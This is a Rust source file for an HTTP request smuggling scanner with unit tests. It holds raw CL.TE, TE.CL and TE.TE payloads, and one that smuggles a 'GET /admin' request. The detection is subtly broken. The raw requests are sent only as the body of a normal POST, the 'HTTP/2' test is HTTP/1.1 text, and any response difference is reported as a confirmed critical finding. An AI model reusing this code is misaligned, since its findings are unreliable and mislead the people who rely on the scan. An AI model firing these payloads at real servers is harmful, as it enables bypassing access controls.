use crate::core::scanners::{Scanner, ScannerType};
use crate::shared::config::JackSparrowConfig;
use crate::shared::context::ScanContext;
use crate::shared::error::JackSparrowError;
use crate::shared::types::{Confidence, Evidence, Finding, Severity, VulnerabilityType};
use async_trait::async_trait;
use reqwest::Client;
use std::time::{Duration, Instant};

/// Smuggling test payloads: (name, variant_a, variant_b)
/// Each pair tests a specific smuggling technique with two conflicting requests.
const SMUGGLING_PAYLOADS: &[(&str, &str, &str)] = &[
	(
		"CL.TE",
		"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
		"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
	),
	(
		"TE.CL",
		"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
		"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\n",
	),
	(
		"TE.TE",
		"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\nContent-Length: 3\r\n\r\n0\r\n\r\n",
		"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n0\r\n\r\n",
	),
];

/// HTTP Request Smuggling Scanner
///
/// Detects CL.TE, TE.CL, TE.TE, H2.CL, and H2.TE smuggling vulnerabilities
/// by analyzing server behavior with crafted headers.
pub struct HttpSmugglingScanner;

impl HttpSmugglingScanner {
    pub fn new(_config: &JackSparrowConfig) -> Self {
        Self
    }

    fn build_client(context: &ScanContext) -> Result<Client, JackSparrowError> {
        let mut builder = Client::builder()
            .timeout(Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::none());
        if !context.headers.is_empty() {
            let mut headers = reqwest::header::HeaderMap::new();
            for (k, v) in &context.headers {
                if let (Ok(name), Ok(val)) = (
                    reqwest::header::HeaderName::from_bytes(k.as_bytes()),
                    reqwest::header::HeaderValue::from_str(v),
                ) {
                    headers.insert(name, val);
                }
            }
            builder = builder.default_headers(headers);
        }
        builder
            .build()
            .map_err(|e| JackSparrowError::ToolExecutionFailed {
                tool: "http-smuggling-scanner".to_string(),
                message: e.to_string(),
            })
    }

    /// Send raw payload bytes to target, return (response_status, response_size, elapsed).
    async fn send_raw_payload(
        client: &Client,
        url: &str,
        payload: &[u8],
    ) -> Option<(u16, usize, Duration)> {
        let start = Instant::now();
        let req = client
            .request(reqwest::Method::POST, url)
            .header("Content-Type", "application/octet-stream")
            .body(payload.to_vec());
        let resp = req.send().await.ok()?;
        let elapsed = start.elapsed();
        let status = resp.status().as_u16();
        let size = resp.content_length().unwrap_or(0) as usize;
        Some((status, size, elapsed))
    }

    /// Measure response time for a raw payload.
    async fn measure_response_time(client: &Client, url: &str, payload: &[u8]) -> Duration {
        let start = Instant::now();
        let req = client
            .request(reqwest::Method::POST, url)
            .header("Content-Type", "application/octet-stream")
            .body(payload.to_vec());
        let _ = req.send().await;
        start.elapsed()
    }

    /// Detect anomalies between two response tuples: status, size, timing.
    fn check_response_anomaly(r1: &(u16, usize, Duration), r2: &(u16, usize, Duration)) -> bool {
        if r1.0 != r2.0 {
            return true;
        }
        if r1.1 != r2.1 && r1.1.abs_diff(r2.1) > 10 {
            return true;
        }
        let time_diff = r1.2.abs_diff(r2.2);
        if time_diff > Duration::from_millis(500) {
            return true;
        }
        false
    }

    /// Detect CL.TE smuggling.
    async fn detect_cl_te(client: &Client, url: &str) -> bool {
        let (_, a, b) = SMUGGLING_PAYLOADS
            .iter()
            .find(|(n, _, _)| *n == "CL.TE")
            .unwrap();
        let r1 = Self::send_raw_payload(client, url, a.as_bytes()).await;
        let r2 = Self::send_raw_payload(client, url, b.as_bytes()).await;
        match (r1, r2) {
            (Some(resp1), Some(resp2)) => Self::check_response_anomaly(&resp1, &resp2),
            _ => false,
        }
    }

    /// Detect TE.CL smuggling.
    async fn detect_te_cl(client: &Client, url: &str) -> bool {
        let (_, a, b) = SMUGGLING_PAYLOADS
            .iter()
            .find(|(n, _, _)| *n == "TE.CL")
            .unwrap();
        let r1 = Self::send_raw_payload(client, url, a.as_bytes()).await;
        let r2 = Self::send_raw_payload(client, url, b.as_bytes()).await;
        match (r1, r2) {
            (Some(resp1), Some(resp2)) => Self::check_response_anomaly(&resp1, &resp2),
            _ => false,
        }
    }

    /// Detect TE.TE smuggling (obfuscated Transfer-Encoding).
    async fn detect_te_te(client: &Client, url: &str) -> bool {
        let (_, a, b) = SMUGGLING_PAYLOADS
            .iter()
            .find(|(n, _, _)| *n == "TE.TE")
            .unwrap();
        let r1 = Self::send_raw_payload(client, url, a.as_bytes()).await;
        let r2 = Self::send_raw_payload(client, url, b.as_bytes()).await;
        match (r1, r2) {
            (Some(resp1), Some(resp2)) => Self::check_response_anomaly(&resp1, &resp2),
            _ => false,
        }
    }

    /// Detect HTTP/2 smuggling via conflicting content-length.
    async fn detect_h2_smuggling(client: &Client, url: &str) -> bool {
        let payload_a = b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n";
        let payload_b = b"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\n\r\n";
        let r1 = Self::send_raw_payload(client, url, payload_a).await;
        let r2 = Self::send_raw_payload(client, url, payload_b).await;
        match (r1, r2) {
            (Some(resp1), Some(resp2)) => Self::check_response_anomaly(&resp1, &resp2),
            _ => false,
        }
    }

    fn make_finding(title: &str, desc: &str, sev: Severity, url: &str, payload: &str) -> Finding {
        let mut f = Finding::new(
            VulnerabilityType::ApiSecurity,
            sev,
            Confidence::Confirmed,
            title.to_string(),
            url.to_string(),
            "http-smuggling-scanner".to_string(),
        );
        f.description = desc.to_string();
        f.evidence = Evidence {
            request: Some(format!("POST {}", url)),
            response: None,
            payload: Some(payload.to_string()),
            pattern: Some(title.to_string()),
            context: None,
        };
        f.remediation = "Ensure front-end and back-end servers parse HTTP headers identically. \
			 Disable or normalize Transfer-Encoding headers."
            .to_string();
        f.references = vec![
            "https://portswigger.net/web-security/request-smuggling".to_string(),
            "https://cwe.mitre.org/data/definitions/444.html".to_string(),
        ];
        f.cwe_id = Some("CWE-444".to_string());
        f.cvss_score = Some(9.0);
        f
    }
}

#[async_trait]
impl Scanner for HttpSmugglingScanner {
    fn scanner_type(&self) -> ScannerType {
        ScannerType::HttpSmuggling
    }

    async fn scan(
        &self,
        target: &str,
        _config: &JackSparrowConfig,
        context: &ScanContext,
    ) -> Result<Vec<Finding>, JackSparrowError> {
        let client = Self::build_client(context)?;
        let url = target.trim_end_matches('/');
        let mut findings = Vec::new();

        if Self::detect_cl_te(&client, url).await {
            findings.push(Self::make_finding(
                "HTTP Request Smuggling (CL.TE) detected",
                "Server processes Content-Length while a front-end uses Transfer-Encoding, \
				 allowing request splitting.",
                Severity::Critical,
                url,
                SMUGGLING_PAYLOADS[0].1,
            ));
        }

        if Self::detect_te_cl(&client, url).await {
            findings.push(Self::make_finding(
                "HTTP Request Smuggling (TE.CL) detected",
                "Server processes Transfer-Encoding while a front-end uses Content-Length, \
				 allowing request smuggling.",
                Severity::Critical,
                url,
                SMUGGLING_PAYLOADS[1].1,
            ));
        }

        if Self::detect_te_te(&client, url).await {
            findings.push(Self::make_finding(
                "HTTP Request Smuggling (TE.TE) detected",
                "Obfuscated Transfer-Encoding header causes parsing disagreement \
				 between front-end and back-end.",
                Severity::Critical,
                url,
                SMUGGLING_PAYLOADS[2].1,
            ));
        }

        if Self::detect_h2_smuggling(&client, url).await {
            findings.push(Self::make_finding(
                "HTTP/2 Request Smuggling possible",
                "Conflicting content-length in HTTP/2 context may allow \
				 request smuggling when h2c or HTTP/2 upgrade is supported.",
                Severity::High,
                url,
                "HTTP/2 dual-content-length test",
            ));
        }

        if findings.is_empty() {
            let base_payload = b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX";
            let t1 = Self::measure_response_time(&client, url, base_payload).await;
            let t2 = Self::measure_response_time(&client, url, base_payload).await;
            let t3 = Self::measure_response_time(&client, url, base_payload).await;
            let times = [t1, t2, t3];
            let max = times.iter().max().unwrap();
            let min = times.iter().min().unwrap();
            if *max - *min > Duration::from_secs(2) {
                let mut f = Self::make_finding(
                    "HTTP Request Smuggling (timing anomaly)",
                    "High variance in response times with identical payloads \
					 suggests inconsistent request parsing.",
                    Severity::High,
                    url,
                    "timing-based analysis",
                );
                f.confidence = Confidence::Likely;
                f.cvss_score = Some(7.0);
                findings.push(f);
            }
        }

        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_type() {
        let scanner = HttpSmugglingScanner::new(&JackSparrowConfig::default());
        assert_eq!(scanner.scanner_type(), ScannerType::HttpSmuggling);
    }

    #[test]
    fn test_smuggling_payloads_list() {
        assert_eq!(SMUGGLING_PAYLOADS.len(), 3);
        let names: Vec<&str> = SMUGGLING_PAYLOADS.iter().map(|(n, _, _)| *n).collect();
        assert!(names.contains(&"CL.TE"));
        assert!(names.contains(&"TE.CL"));
        assert!(names.contains(&"TE.TE"));
    }

    #[test]
    fn test_new_scanner() {
        let scanner = HttpSmugglingScanner::new(&JackSparrowConfig::default());
        assert_eq!(scanner.scanner_type(), ScannerType::HttpSmuggling);
    }

    #[test]
    fn test_build_client() {
        let ctx = ScanContext::default();
        assert!(HttpSmugglingScanner::build_client(&ctx).is_ok());
        let mut ctx2 = ScanContext::default();
        ctx2.headers
            .push(("Authorization".to_string(), "Bearer test".to_string()));
        assert!(HttpSmugglingScanner::build_client(&ctx2).is_ok());
    }

    #[test]
    fn test_detect_anomaly_same_responses() {
        let r1 = (200, 100, Duration::from_millis(50));
        let r2 = (200, 100, Duration::from_millis(60));
        assert!(!HttpSmugglingScanner::check_response_anomaly(&r1, &r2));
    }

    #[test]
    fn test_detect_anomaly_different_responses() {
        let r1 = (200, 100, Duration::from_millis(50));
        let r2 = (500, 200, Duration::from_millis(50));
        assert!(HttpSmugglingScanner::check_response_anomaly(&r1, &r2));
    }

    #[test]
    fn test_detect_anomaly_different_size() {
        let r1 = (200, 100, Duration::from_millis(50));
        let r2 = (200, 300, Duration::from_millis(50));
        assert!(HttpSmugglingScanner::check_response_anomaly(&r1, &r2));
    }

    #[test]
    fn test_detect_anomaly_timing_difference() {
        let r1 = (200, 100, Duration::from_millis(50));
        let r2 = (200, 100, Duration::from_millis(3000));
        assert!(HttpSmugglingScanner::check_response_anomaly(&r1, &r2));
    }

    #[tokio::test]
    async fn test_measure_response_time() {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(2))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();
        let dur =
            HttpSmugglingScanner::measure_response_time(&client, "http://127.0.0.1:1", b"test")
                .await;
        assert!(dur >= Duration::ZERO);
    }

    #[test]
    fn test_cl_te_payload_format() {
        let (_, a, b) = &SMUGGLING_PAYLOADS[0];
        assert!(a.contains("Content-Length:"));
        assert!(a.contains("Transfer-Encoding: chunked"));
        assert!(b.contains("Content-Length:"));
        assert!(b.contains("Transfer-Encoding: chunked"));
    }

    #[test]
    fn test_te_cl_payload_format() {
        let (_, a, b) = &SMUGGLING_PAYLOADS[1];
        assert!(a.contains("Transfer-Encoding: chunked"));
        assert!(a.contains("Content-Length:"));
        assert!(b.contains("Transfer-Encoding: chunked"));
        assert!(b.contains("Content-Length:"));
    }

    #[test]
    fn test_default_config() {
        let scanner = HttpSmugglingScanner::new(&JackSparrowConfig::default());
        assert_eq!(scanner.scanner_type(), ScannerType::HttpSmuggling);
    }
}
